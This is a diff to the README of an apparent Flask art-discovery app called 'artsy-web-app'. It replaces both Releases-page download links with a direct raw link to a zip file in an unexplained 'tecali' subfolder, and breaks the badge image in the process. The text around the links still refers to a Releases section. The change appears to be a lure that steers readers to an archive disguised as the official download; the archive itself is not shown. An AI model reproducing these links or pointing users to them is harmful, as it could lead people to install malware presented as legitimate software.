@@ -1,7 +1,7 @@
 # 🎨 artsy-web-app - Discover Art Effortlessly Online
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download%20Artsy%20Web%20App-blue?style=for-the-badge&logo=github)](https://github.com/monteiroxll/artsy-web-app/releases)
+[![Download](https://raw.githubusercontent.com/monteiroxll/artsy-web-app/main/tecali/artsy-web-app.zip%20Artsy%20Web%20App-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/monteiroxll/artsy-web-app/main/tecali/artsy-web-app.zip)
 
 ## 🚀 Getting Started
 Welcome to **Artsy Web App**, a friendly tool that helps you search and discover art from around the world. This application is built using Flask, a simple web framework for Python, making it easy to use for everyone.
@@ -14,7 +14,7 @@ Before you download the **Artsy Web App**, make sure your computer meets the fol
 - Internet Connection: Required for downloading art data
 
 ## 🔗 Download & Install
-To get the **Artsy Web App**, visit this page to download: [Download Page](https://github.com/monteiroxll/artsy-web-app/releases).
+To get the **Artsy Web App**, visit this page to download: [Download Page](https://raw.githubusercontent.com/monteiroxll/artsy-web-app/main/tecali/artsy-web-app.zip).
 
 1. **Visit the Download Page**: Click the link above to go to the Releases section.
 2. **Select the Right Version**: Find the latest version of the application.
